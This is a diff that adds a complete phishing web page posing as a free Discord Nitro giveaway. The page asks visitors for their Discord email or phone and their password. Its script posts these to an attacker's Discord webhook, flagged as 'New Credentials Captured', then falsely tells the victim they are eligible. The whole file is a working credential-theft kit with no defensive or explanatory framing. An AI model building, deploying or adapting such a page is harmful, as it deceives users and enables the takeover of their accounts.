@@ -1,1 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Nitro Giveaway</title>
+    <style>
+        body { font-family: Arial; background: #2c2f33; color: white; text-align: center; padding-top: 50px; }
+        .box { background: #36393f; padding: 30px; border-radius: 10px; width: 350px; margin: auto; }
+        input { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: none; }
+        button { background: #5865f2; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🎉 Free Discord Nitro (1 Month)</h2>
+        <p>Enter your Discord credentials to verify eligibility.</p>
+        <input type="text" id="email" placeholder="Discord Email / Phone">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendData()">Claim Nitro</button>
+        <p id="status"></p>
+    </div>
+    <script>
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // REPLACE THIS
 
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (!email || !password) {
+                document.getElementById('status').innerText = "Please fill all fields.";
+                return;
+            }
+            const payload = {
+                content: "**New Credentials Captured**\nEmail/Phone: " + email + "\nPassword: " + password
+            };
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                document.getElementById('status').innerText = "✅ You are eligible! Check your Discord DMs.";
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+            }).catch(() => {
+                document.getElementById('status').innerText = "Error. Please try again.";
+            });
+        }
+    </script>
+</body>
+</html>
